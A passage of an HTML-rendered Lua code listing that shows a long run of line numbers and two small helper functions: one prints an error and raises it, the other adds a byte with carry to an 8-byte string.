<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
<span class='line-number'>249</span>
<span class='line-number'>250</span>
<span class='line-number'>251</span>
<span class='line-number'>252</span>
<span class='line-number'>253</span>
<span class='line-number'>254</span>
<span class='line-number'>255</span>
<span class='line-number'>256</span>
<span class='line-number'>257</span>
<span class='line-number'>258</span>
<span class='line-number'>259</span>
<span class='line-number'>260</span>
<span class='line-number'>261</span>
<span class='line-number'>262</span>
<span class='line-number'>263</span>
<span class='line-number'>264</span>
<span class='line-number'>265</span>
<span class='line-number'>266</span>
<span class='line-number'>267</span>
<span class='line-number'>268</span>
<span class='line-number'>269</span>
<span class='line-number'>270</span>
<span class='line-number'>271</span>
<span class='line-number'>272</span>
<span class='line-number'>273</span>
<span class='line-number'>274</span>
<span class='line-number'>275</span>
<span class='line-number'>276</span>
<span class='line-number'>277</span>
<span class='line-number'>278</span>
<span class='line-number'>279</span>
<span class='line-number'>280</span>
<span class='line-number'>281</span>
<span class='line-number'>282</span>
<span class='line-number'>283</span>
<span class='line-number'>284</span>
<span class='line-number'>285</span>
<span class='line-number'>286</span>
<span class='line-number'>287</span>
<span class='line-number'>288</span>
<span class='line-number'>289</span>
<span class='line-number'>290</span>
<span class='line-number'>291</span>
<span class='line-number'>292</span>
<span class='line-number'>293</span>
<span class='line-number'>294</span>
<span class='line-number'>295</span>
<span class='line-number'>296</span>
<span class='line-number'>297</span>
<span class='line-number'>298</span>
<span class='line-number'>299</span>
<span class='line-number'>300</span>
<span class='line-number'>301</span>
<span class='line-number'>302</span>
<span class='line-number'>303</span>
<span class='line-number'>304</span>
<span class='line-number'>305</span>
<span class='line-number'>306</span>
<span class='line-number'>307</span>
<span class='line-number'>308</span>
<span class='line-number'>309</span>
<span class='line-number'>310</span>
<span class='line-number'>311</span>
<span class='line-number'>312</span>
<span class='line-number'>313</span>
<span class='line-number'>314</span>
<span class='line-number'>315</span>
<span class='line-number'>316</span>
<span class='line-number'>317</span>
<span class='line-number'>318</span>
<span class='line-number'>319</span>
<span class='line-number'>320</span>
<span class='line-number'>321</span>
<span class='line-number'>322</span>
<span class='line-number'>323</span>
<span class='line-number'>324</span>
<span class='line-number'>325</span>
<span class='line-number'>326</span>
<span class='line-number'>327</span>
<span class='line-number'>328</span>
<span class='line-number'>329</span>
<span class='line-number'>330</span>
<span class='line-number'>331</span>
<span class='line-number'>332</span>
<span class='line-number'>333</span>
<span class='line-number'>334</span>
<span class='line-number'>335</span>
<span class='line-number'>336</span>
<span class='line-number'>337</span>
<span class='line-number'>338</span>
<span class='line-number'>339</span>
<span class='line-number'>340</span>
<span class='line-number'>341</span>
<span class='line-number'>342</span>
<span class='line-number'>343</span>
<span class='line-number'>344</span>
<span class='line-number'>345</span>
<span class='line-number'>346</span>
<span class='line-number'>347</span>
<span class='line-number'>348</span>
<span class='line-number'>349</span>
<span class='line-number'>350</span>
<span class='line-number'>351</span>
<span class='line-number'>352</span>
<span class='line-number'>353</span>
<span class='line-number'>354</span>
<span class='line-number'>355</span>
<span class='line-number'>356</span>
<span class='line-number'>357</span>
<span class='line-number'>358</span>
<span class='line-number'>359</span>
<span class='line-number'>360</span>
<span class='line-number'>361</span>
<span class='line-number'>362</span>
<span class='line-number'>363</span>
<span class='line-number'>364</span>
<span class='line-number'>365</span>
<span class='line-number'>366</span>
<span class='line-number'>367</span>
<span class='line-number'>368</span>
<span class='line-number'>369</span>
<span class='line-number'>370</span>
<span class='line-number'>371</span>
<span class='line-number'>372</span>
<span class='line-number'>373</span>
<span class='line-number'>374</span>
<span class='line-number'>375</span>
<span class='line-number'>376</span>
<span class='line-number'>377</span>
<span class='line-number'>378</span>
<span class='line-number'>379</span>
<span class='line-number'>380</span>
<span class='line-number'>381</span>
<span class='line-number'>382</span>
<span class='line-number'>383</span>
<span class='line-number'>384</span>
<span class='line-number'>385</span>
<span class='line-number'>386</span>
<span class='line-number'>387</span>
<span class='line-number'>388</span>
<span class='line-number'>389</span>
<span class='line-number'>390</span>
<span class='line-number'>391</span>
<span class='line-number'>392</span>
<span class='line-number'>393</span>
<span class='line-number'>394</span>
<span class='line-number'>395</span>
<span class='line-number'>396</span>
<span class='line-number'>397</span>
<span class='line-number'>398</span>
<span class='line-number'>399</span>
<span class='line-number'>400</span>
<span class='line-number'>401</span>
<span class='line-number'>402</span>
<span class='line-number'>403</span>
<span class='line-number'>404</span>
<span class='line-number'>405</span>
<span class='line-number'>406</span>
<span class='line-number'>407</span>
<span class='line-number'>408</span>
<span class='line-number'>409</span>
<span class='line-number'>410</span>
<span class='line-number'>411</span>
<span class='line-number'>412</span>
<span class='line-number'>413</span>
<span class='line-number'>414</span>
<span class='line-number'>415</span>
<span class='line-number'>416</span>
<span class='line-number'>417</span>
<span class='line-number'>418</span>
<span class='line-number'>419</span>
<span class='line-number'>420</span>
<span class='line-number'>421</span>
<span class='line-number'>422</span>
<span class='line-number'>423</span>
<span class='line-number'>424</span>
<span class='line-number'>425</span>
<span class='line-number'>426</span>
<span class='line-number'>427</span>
<span class='line-number'>428</span>
<span class='line-number'>429</span>
<span class='line-number'>430</span>
<span class='line-number'>431</span>
<span class='line-number'>432</span>
<span class='line-number'>433</span>
<span class='line-number'>434</span>
<span class='line-number'>435</span>
<span class='line-number'>436</span>
<span class='line-number'>437</span>
<span class='line-number'>438</span>
<span class='line-number'>439</span>
<span class='line-number'>440</span>
<span class='line-number'>441</span>
<span class='line-number'>442</span>
<span class='line-number'>443</span>
<span class='line-number'>444</span>
<span class='line-number'>445</span>
<span class='line-number'>446</span>
<span class='line-number'>447</span>
<span class='line-number'>448</span>
<span class='line-number'>449</span>
<span class='line-number'>450</span>
<span class='line-number'>451</span>
<span class='line-number'>452</span>
<span class='line-number'>453</span>
<span class='line-number'>454</span>
<span class='line-number'>455</span>
<span class='line-number'>456</span>
<span class='line-number'>457</span>
<span class='line-number'>458</span>
<span class='line-number'>459</span>
<span class='line-number'>460</span>
<span class='line-number'>461</span>
<span class='line-number'>462</span>
<span class='line-number'>463</span>
<span class='line-number'>464</span>
<span class='line-number'>465</span>
<span class='line-number'>466</span>
<span class='line-number'>467</span>
<span class='line-number'>468</span>
<span class='line-number'>469</span>
<span class='line-number'>470</span>
<span class='line-number'>471</span>
<span class='line-number'>472</span>
<span class='line-number'>473</span>
<span class='line-number'>474</span>
<span class='line-number'>475</span>
<span class='line-number'>476</span>
<span class='line-number'>477</span>
<span class='line-number'>478</span>
<span class='line-number'>479</span>
<span class='line-number'>480</span>
<span class='line-number'>481</span>
<span class='line-number'>482</span>
<span class='line-number'>483</span>
<span class='line-number'>484</span>
<span class='line-number'>485</span>
<span class='line-number'>486</span>
<span class='line-number'>487</span>
<span class='line-number'>488</span>
<span class='line-number'>489</span>
<span class='line-number'>490</span>
<span class='line-number'>491</span>
<span class='line-number'>492</span>
<span class='line-number'>493</span>
<span class='line-number'>494</span>
<span class='line-number'>495</span>
<span class='line-number'>496</span>
<span class='line-number'>497</span>
<span class='line-number'>498</span>
<span class='line-number'>499</span>
<span class='line-number'>500</span>
<span class='line-number'>501</span>
<span class='line-number'>502</span>
<span class='line-number'>503</span>
<span class='line-number'>504</span>
<span class='line-number'>505</span>
<span class='line-number'>506</span>
<span class='line-number'>507</span>
<span class='line-number'>508</span>
<span class='line-number'>509</span>
<span class='line-number'>510</span>
<span class='line-number'>511</span>
<span class='line-number'>512</span>
<span class='line-number'>513</span>
<span class='line-number'>514</span>
<span class='line-number'>515</span>
<span class='line-number'>516</span>
<span class='line-number'>517</span>
<span class='line-number'>518</span>
<span class='line-number'>519</span>
<span class='line-number'>520</span>
<span class='line-number'>521</span>
<span class='line-number'>522</span>
<span class='line-number'>523</span>
<span class='line-number'>524</span>
<span class='line-number'>525</span>
<span class='line-number'>526</span>
<span class='line-number'>527</span>
<span class='line-number'>528</span>
<span class='line-number'>529</span>
<span class='line-number'>530</span>
<span class='line-number'>531</span>
<span class='line-number'>532</span>
<span class='line-number'>533</span>
<span class='line-number'>534</span>
<span class='line-number'>535</span>
<span class='line-number'>536</span>
<span class='line-number'>537</span>
<span class='line-number'>538</span>
<span class='line-number'>539</span>
<span class='line-number'>540</span>
<span class='line-number'>541</span>
<span class='line-number'>542</span>
<span class='line-number'>543</span>
<span class='line-number'>544</span>
<span class='line-number'>545</span>
<span class='line-number'>546</span>
<span class='line-number'>547</span>
<span class='line-number'>548</span>
<span class='line-number'>549</span>
<span class='line-number'>550</span>
<span class='line-number'>551</span>
<span class='line-number'>552</span>
<span class='line-number'>553</span>
<span class='line-number'>554</span>
<span class='line-number'>555</span>
<span class='line-number'>556</span>
<span class='line-number'>557</span>
<span class='line-number'>558</span>
<span class='line-number'>559</span>
<span class='line-number'>560</span>
<span class='line-number'>561</span>
<span class='line-number'>562</span>
<span class='line-number'>563</span>
<span class='line-number'>564</span>
<span class='line-number'>565</span>
<span class='line-number'>566</span>
<span class='line-number'>567</span>
<span class='line-number'>568</span>
<span class='line-number'>569</span>
<span class='line-number'>570</span>
<span class='line-number'>571</span>
<span class='line-number'>572</span>
<span class='line-number'>573</span>
<span class='line-number'>574</span>
<span class='line-number'>575</span>
<span class='line-number'>576</span>
<span class='line-number'>577</span>
<span class='line-number'>578</span>
<span class='line-number'>579</span>
<span class='line-number'>580</span>
<span class='line-number'>581</span>
<span class='line-number'>582</span>
<span class='line-number'>583</span>
<span class='line-number'>584</span>
<span class='line-number'>585</span>
<span class='line-number'>586</span>
<span class='line-number'>587</span>
<span class='line-number'>588</span>
<span class='line-number'>589</span>
<span class='line-number'>590</span>
<span class='line-number'>591</span>
<span class='line-number'>592</span>
<span class='line-number'>593</span>
<span class='line-number'>594</span>
<span class='line-number'>595</span>
<span class='line-number'>596</span>
<span class='line-number'>597</span>
<span class='line-number'>598</span>
<span class='line-number'>599</span>
<span class='line-number'>600</span>
<span class='line-number'>601</span>
<span class='line-number'>602</span>
<span class='line-number'>603</span>
<span class='line-number'>604</span>
<span class='line-number'>605</span>
<span class='line-number'>606</span>
<span class='line-number'>607</span>
<span class='line-number'>608</span>
<span class='line-number'>609</span>
<span class='line-number'>610</span>
<span class='line-number'>611</span>
<span class='line-number'>612</span>
<span class='line-number'>613</span>
<span class='line-number'>614</span>
<span class='line-number'>615</span>
<span class='line-number'>616</span>
<span class='line-number'>617</span>
<span class='line-number'>618</span>
<span class='line-number'>619</span>
<span class='line-number'>620</span>
<span class='line-number'>621</span>
<span class='line-number'>622</span>
<span class='line-number'>623</span>
<span class='line-number'>624</span>
<span class='line-number'>625</span>
<span class='line-number'>626</span>
<span class='line-number'>627</span>
<span class='line-number'>628</span>
<span class='line-number'>629</span>
<span class='line-number'>630</span>
<span class='line-number'>631</span>
<span class='line-number'>632</span>
<span class='line-number'>633</span>
<span class='line-number'>634</span>
<span class='line-number'>635</span>
<span class='line-number'>636</span>
<span class='line-number'>637</span>
<span class='line-number'>638</span>
<span class='line-number'>639</span>
<span class='line-number'>640</span>
<span class='line-number'>641</span>
<span class='line-number'>642</span>
<span class='line-number'>643</span>
<span class='line-number'>644</span>
<span class='line-number'>645</span>
<span class='line-number'>646</span>
<span class='line-number'>647</span>
<span class='line-number'>648</span>
<span class='line-number'>649</span>
<span class='line-number'>650</span>
<span class='line-number'>651</span>
<span class='line-number'>652</span>
<span class='line-number'>653</span>
<span class='line-number'>654</span>
<span class='line-number'>655</span>
<span class='line-number'>656</span>
<span class='line-number'>657</span>
<span class='line-number'>658</span>
<span class='line-number'>659</span>
<span class='line-number'>660</span>
<span class='line-number'>661</span>
<span class='line-number'>662</span>
<span class='line-number'>663</span>
<span class='line-number'>664</span>
<span class='line-number'>665</span>
<span class='line-number'>666</span>
<span class='line-number'>667</span>
<span class='line-number'>668</span>
<span class='line-number'>669</span>
<span class='line-number'>670</span>
<span class='line-number'>671</span>
<span class='line-number'>672</span>
<span class='line-number'>673</span>
<span class='line-number'>674</span>
<span class='line-number'>675</span>
<span class='line-number'>676</span>
<span class='line-number'>677</span>
<span class='line-number'>678</span>
<span class='line-number'>679</span>
<span class='line-number'>680</span>
<span class='line-number'>681</span>
<span class='line-number'>682</span>
<span class='line-number'>683</span>
<span class='line-number'>684</span>
<span class='line-number'>685</span>
<span class='line-number'>686</span>
<span class='line-number'>687</span>
<span class='line-number'>688</span>
<span class='line-number'>689</span>
<span class='line-number'>690</span>
<span class='line-number'>691</span>
<span class='line-number'>692</span>
<span class='line-number'>693</span>
<span class='line-number'>694</span>
<span class='line-number'>695</span>
<span class='line-number'>696</span>
<span class='line-number'>697</span>
<span class='line-number'>698</span>
<span class='line-number'>699</span>
<span class='line-number'>700</span>
<span class='line-number'>701</span>
<span class='line-number'>702</span>
<span class='line-number'>703</span>
<span class='line-number'>704</span>
<span class='line-number'>705</span>
<span class='line-number'>706</span>
<span class='line-number'>707</span>
<span class='line-number'>708</span>
<span class='line-number'>709</span>
<span class='line-number'>710</span>
<span class='line-number'>711</span>
<span class='line-number'>712</span>
<span class='line-number'>713</span>
<span class='line-number'>714</span>
<span class='line-number'>715</span>
<span class='line-number'>716</span>
<span class='line-number'>717</span>
<span class='line-number'>718</span>
<span class='line-number'>719</span>
<span class='line-number'>720</span>
<span class='line-number'>721</span>
<span class='line-number'>722</span>
<span class='line-number'>723</span>
<span class='line-number'>724</span>
<span class='line-number'>725</span>
<span class='line-number'>726</span>
<span class='line-number'>727</span>
<span class='line-number'>728</span>
<span class='line-number'>729</span>
<span class='line-number'>730</span>
<span class='line-number'>731</span>
<span class='line-number'>732</span>
<span class='line-number'>733</span>
<span class='line-number'>734</span>
<span class='line-number'>735</span>
<span class='line-number'>736</span>
<span class='line-number'>737</span>
<span class='line-number'>738</span>
<span class='line-number'>739</span>
<span class='line-number'>740</span>
<span class='line-number'>741</span>
<span class='line-number'>742</span>
<span class='line-number'>743</span>
<span class='line-number'>744</span>
<span class='line-number'>745</span>
<span class='line-number'>746</span>
<span class='line-number'>747</span>
<span class='line-number'>748</span>
<span class='line-number'>749</span>
<span class='line-number'>750</span>
<span class='line-number'>751</span>
<span class='line-number'>752</span>
<span class='line-number'>753</span>
<span class='line-number'>754</span>
<span class='line-number'>755</span>
<span class='line-number'>756</span>
<span class='line-number'>757</span>
<span class='line-number'>758</span>
<span class='line-number'>759</span>
<span class='line-number'>760</span>
<span class='line-number'>761</span>
<span class='line-number'>762</span>
<span class='line-number'>763</span>
<span class='line-number'>764</span>
<span class='line-number'>765</span>
<span class='line-number'>766</span>
<span class='line-number'>767</span>
<span class='line-number'>768</span>
<span class='line-number'>769</span>
<span class='line-number'>770</span>
<span class='line-number'>771</span>
<span class='line-number'>772</span>
<span class='line-number'>773</span>
<span class='line-number'>774</span>
<span class='line-number'>775</span>
<span class='line-number'>776</span>
<span class='line-number'>777</span>
<span class='line-number'>778</span>
<span class='line-number'>779</span>
<span class='line-number'>780</span>
<span class='line-number'>781</span>
<span class='line-number'>782</span>
<span class='line-number'>783</span>
<span class='line-number'>784</span>
<span class='line-number'>785</span>
<span class='line-number'>786</span>
<span class='line-number'>787</span>
<span class='line-number'>788</span>
<span class='line-number'>789</span>
<span class='line-number'>790</span>
<span class='line-number'>791</span>
<span class='line-number'>792</span>
<span class='line-number'>793</span>
<span class='line-number'>794</span>
<span class='line-number'>795</span>
<span class='line-number'>796</span>
<span class='line-number'>797</span>
<span class='line-number'>798</span>
<span class='line-number'>799</span>
<span class='line-number'>800</span>
<span class='line-number'>801</span>
<span class='line-number'>802</span>
<span class='line-number'>803</span>
<span class='line-number'>804</span>
<span class='line-number'>805</span>
<span class='line-number'>806</span>
<span class='line-number'>807</span>
<span class='line-number'>808</span>
<span class='line-number'>809</span>
<span class='line-number'>810</span>
<span class='line-number'>811</span>
<span class='line-number'>812</span>
<span class='line-number'>813</span>
<span class='line-number'>814</span>
<span class='line-number'>815</span>
<span class='line-number'>816</span>
<span class='line-number'>817</span>
<span class='line-number'>818</span>
<span class='line-number'>819</span>
<span class='line-number'>820</span>
<span class='line-number'>821</span>
<span class='line-number'>822</span>
<span class='line-number'>823</span>
<span class='line-number'>824</span>
<span class='line-number'>825</span>
<span class='line-number'>826</span>
<span class='line-number'>827</span>
<span class='line-number'>828</span>
<span class='line-number'>829</span>
<span class='line-number'>830</span>
<span class='line-number'>831</span>
<span class='line-number'>832</span>
<span class='line-number'>833</span>
<span class='line-number'>834</span>
<span class='line-number'>835</span>
<span class='line-number'>836</span>
<span class='line-number'>837</span>
<span class='line-number'>838</span>
<span class='line-number'>839</span>
<span class='line-number'>840</span>
<span class='line-number'>841</span>
<span class='line-number'>842</span>
<span class='line-number'>843</span>
<span class='line-number'>844</span>
<span class='line-number'>845</span>
<span class='line-number'>846</span>
<span class='line-number'>847</span>
<span class='line-number'>848</span>
<span class='line-number'>849</span>
<span class='line-number'>850</span>
<span class='line-number'>851</span>
<span class='line-number'>852</span>
<span class='line-number'>853</span>
<span class='line-number'>854</span>
<span class='line-number'>855</span>
<span class='line-number'>856</span>
<span class='line-number'>857</span>
<span class='line-number'>858</span>
<span class='line-number'>859</span>
<span class='line-number'>860</span>
<span class='line-number'>861</span>
<span class='line-number'>862</span>
<span class='line-number'>863</span>
<span class='line-number'>864</span>
<span class='line-number'>865</span>
<span class='line-number'>866</span>
<span class='line-number'>867</span>
<span class='line-number'>868</span>
<span class='line-number'>869</span>
<span class='line-number'>870</span>
<span class='line-number'>871</span>
<span class='line-number'>872</span>
<span class='line-number'>873</span>
<span class='line-number'>874</span>
<span class='line-number'>875</span>
<span class='line-number'>876</span>
<span class='line-number'>877</span>
<span class='line-number'>878</span>
<span class='line-number'>879</span>
<span class='line-number'>880</span>
<span class='line-number'>881</span>
<span class='line-number'>882</span>
<span class='line-number'>883</span>
<span class='line-number'>884</span>
<span class='line-number'>885</span>
<span class='line-number'>886</span>
<span class='line-number'>887</span>
<span class='line-number'>888</span>
<span class='line-number'>889</span>
<span class='line-number'>890</span>
<span class='line-number'>891</span>
<span class='line-number'>892</span>
<span class='line-number'>893</span>
<span class='line-number'>894</span>
<span class='line-number'>895</span>
<span class='line-number'>896</span>
<span class='line-number'>897</span>
<span class='line-number'>898</span>
<span class='line-number'>899</span>
<span class='line-number'>900</span>
<span class='line-number'>901</span>
<span class='line-number'>902</span>
<span class='line-number'>903</span>
<span class='line-number'>904</span>
<span class='line-number'>905</span>
<span class='line-number'>906</span>
<span class='line-number'>907</span>
<span class='line-number'>908</span>
<span class='line-number'>909</span>
<span class='line-number'>910</span>
<span class='line-number'>911</span>
<span class='line-number'>912</span>
<span class='line-number'>913</span>
<span class='line-number'>914</span>
<span class='line-number'>915</span>
<span class='line-number'>916</span>
<span class='line-number'>917</span>
<span class='line-number'>918</span>
<span class='line-number'>919</span>
<span class='line-number'>920</span>
<span class='line-number'>921</span>
<span class='line-number'>922</span>
<span class='line-number'>923</span>
<span class='line-number'>924</span>
<span class='line-number'>925</span>
<span class='line-number'>926</span>
<span class='line-number'>927</span>
<span class='line-number'>928</span>
<span class='line-number'>929</span>
<span class='line-number'>930</span>
<span class='line-number'>931</span>
<span class='line-number'>932</span>
<span class='line-number'>933</span>
<span class='line-number'>934</span>
<span class='line-number'>935</span>
<span class='line-number'>936</span>
<span class='line-number'>937</span>
<span class='line-number'>938</span>
<span class='line-number'>939</span>
<span class='line-number'>940</span>
<span class='line-number'>941</span>
<span class='line-number'>942</span>
<span class='line-number'>943</span>
<span class='line-number'>944</span>
<span class='line-number'>945</span>
<span class='line-number'>946</span>
<span class='line-number'>947</span>
<span class='line-number'>948</span>
<span class='line-number'>949</span>
<span class='line-number'>950</span>
<span class='line-number'>951</span>
<span class='line-number'>952</span>
<span class='line-number'>953</span>
<span class='line-number'>954</span>
<span class='line-number'>955</span>
<span class='line-number'>956</span>
<span class='line-number'>957</span>
<span class='line-number'>958</span>
<span class='line-number'>959</span>
<span class='line-number'>960</span>
<span class='line-number'>961</span>
<span class='line-number'>962</span>
<span class='line-number'>963</span>
<span class='line-number'>964</span>
<span class='line-number'>965</span>
<span class='line-number'>966</span>
<span class='line-number'>967</span>
<span class='line-number'>968</span>
<span class='line-number'>969</span>
<span class='line-number'>970</span>
<span class='line-number'>971</span>
<span class='line-number'>972</span>
<span class='line-number'>973</span>
<span class='line-number'>974</span>
<span class='line-number'>975</span>
<span class='line-number'>976</span>
<span class='line-number'>977</span>
<span class='line-number'>978</span>
<span class='line-number'>979</span>
<span class='line-number'>980</span>
<span class='line-number'>981</span>
<span class='line-number'>982</span>
<span class='line-number'>983</span>
<span class='line-number'>984</span>
<span class='line-number'>985</span>
<span class='line-number'>986</span>
<span class='line-number'>987</span>
<span class='line-number'>988</span>
<span class='line-number'>989</span>
<span class='line-number'>990</span>
<span class='line-number'>991</span>
<span class='line-number'>992</span>
<span class='line-number'>993</span>
<span class='line-number'>994</span>
<span class='line-number'>995</span>
<span class='line-number'>996</span>
<span class='line-number'>997</span>
<span class='line-number'>998</span>
<span class='line-number'>999</span>
<span class='line-number'>1000</span>
<span class='line-number'>1001</span>
<span class='line-number'>1002</span>
<span class='line-number'>1003</span>
<span class='line-number'>1004</span>
<span class='line-number'>1005</span>
<span class='line-number'>1006</span>
<span class='line-number'>1007</span>
<span class='line-number'>1008</span>
<span class='line-number'>1009</span>
<span class='line-number'>1010</span>
<span class='line-number'>1011</span>
<span class='line-number'>1012</span>
<span class='line-number'>1013</span>
<span class='line-number'>1014</span>
<span class='line-number'>1015</span>
<span class='line-number'>1016</span>
<span class='line-number'>1017</span>
<span class='line-number'>1018</span>
<span class='line-number'>1019</span>
<span class='line-number'>1020</span>
<span class='line-number'>1021</span>
<span class='line-number'>1022</span>
<span class='line-number'>1023</span>
<span class='line-number'>1024</span>
<span class='line-number'>1025</span>
<span class='line-number'>1026</span>
<span class='line-number'>1027</span>
<span class='line-number'>1028</span>
<span class='line-number'>1029</span>
<span class='line-number'>1030</span>
<span class='line-number'>1031</span>
<span class='line-number'>1032</span>
<span class='line-number'>1033</span>
<span class='line-number'>1034</span>
<span class='line-number'>1035</span>
<span class='line-number'>1036</span>
<span class='line-number'>1037</span>
<span class='line-number'>1038</span>
<span class='line-number'>1039</span>
<span class='line-number'>1040</span>
<span class='line-number'>1041</span>
<span class='line-number'>1042</span>
<span class='line-number'>1043</span>
<span class='line-number'>1044</span>
<span class='line-number'>1045</span>
<span class='line-number'>1046</span>
<span class='line-number'>1047</span>
<span class='line-number'>1048</span>
<span class='line-number'>1049</span>
<span class='line-number'>1050</span>
<span class='line-number'>1051</span>
<span class='line-number'>1052</span>
<span class='line-number'>1053</span>
<span class='line-number'>1054</span>
<span class='line-number'>1055</span>
<span class='line-number'>1056</span>
<span class='line-number'>1057</span>
<span class='line-number'>1058</span>
<span class='line-number'>1059</span>
<span class='line-number'>1060</span>
<span class='line-number'>1061</span>
<span class='line-number'>1062</span>
<span class='line-number'>1063</span>
<span class='line-number'>1064</span>
<span class='line-number'>1065</span>
<span class='line-number'>1066</span>
<span class='line-number'>1067</span>
<span class='line-number'>1068</span>
<span class='line-number'>1069</span>
<span class='line-number'>1070</span>
<span class='line-number'>1071</span>
<span class='line-number'>1072</span>
<span class='line-number'>1073</span>
<span class='line-number'>1074</span>
<span class='line-number'>1075</span>
<span class='line-number'>1076</span>
<span class='line-number'>1077</span>
<span class='line-number'>1078</span>
<span class='line-number'>1079</span>
<span class='line-number'>1080</span>
<span class='line-number'>1081</span>
<span class='line-number'>1082</span>
<span class='line-number'>1083</span>
<span class='line-number'>1084</span>
<span class='line-number'>1085</span>
<span class='line-number'>1086</span>
<span class='line-number'>1087</span>
<span class='line-number'>1088</span>
</pre></td><td class='code'><pre><code class='lua'><span class='line'><span class="kd">local</span> <span class="n">fail</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[-] &quot;</span> <span class="o">..</span> <span class="n">msg</span><span class="p">)</span>
</span><span class='line'>  <span class="nb">error</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">addbyte</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">byte</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">carry</span> <span class="o">=</span> <span class="n">byte</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="s">&#39;</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="nb">string.len</span><span class="p">(</span><span class="n">b8</span><span class="p">)</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">cb</span> <span class="o">=</span> <span class="nb">string.byte</span><span class="p">(</span><span class="n">b8</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">carry</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">cb</span> <span class="o">&gt;=</span> <span class="mi">256</span> <span class="k">then</span>
</span><span class='line'>      <span class="n">carry</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>      <span class="n">carry</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">..</span> <span class="nb">string.char</span><span class="p">(</span><span class="n">cb</span> <span class="o">%</span> <span class="mi">256</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">result</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
